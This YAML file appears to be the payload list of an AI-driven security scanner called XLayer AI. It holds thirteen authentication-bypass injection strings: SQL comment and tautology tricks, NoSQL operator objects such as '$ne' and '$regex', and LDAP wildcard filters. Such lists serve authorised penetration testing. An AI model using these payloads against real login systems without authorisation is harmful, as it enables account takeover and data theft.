# XLayer AI - Authentication Bypass Payloads

sql_injection:
  - payload: "admin'--"
    description: "SQL comment bypass"
    tags: [sqli]
  
  - payload: "' OR 1=1--"
    description: "OR true bypass"
    tags: [sqli]
  
  - payload: "admin' OR '1'='1"
    description: "Admin OR bypass"
    tags: [sqli]
  
  - payload: "' OR ''='"
    description: "Empty string bypass"
    tags: [sqli]
  
  - payload: "admin'/*"
    description: "Block comment bypass"
    tags: [sqli]
  
  - payload: "') OR ('1'='1"
    description: "Parenthesis bypass"
    tags: [sqli]
  
  - payload: "admin' AND 1=1--"
    description: "AND true bypass"
    tags: [sqli]

nosql_injection:
  - payload: '{"$ne": null}'
    description: "NoSQL not equal"
    tags: [nosql]
  
  - payload: '{"$gt": ""}'
    description: "NoSQL greater than"
    tags: [nosql]
  
  - payload: '{"$regex": ".*"}'
    description: "NoSQL regex match all"
    tags: [nosql]
  
  - payload: '{"$where": "1==1"}'
    description: "NoSQL where injection"
    tags: [nosql]

ldap_injection:
  - payload: "*)(uid=*))(|(uid=*"
    description: "LDAP wildcard"
    tags: [ldap]
  
  - payload: "admin)(&)"
    description: "LDAP filter bypass"
    tags: [ldap]

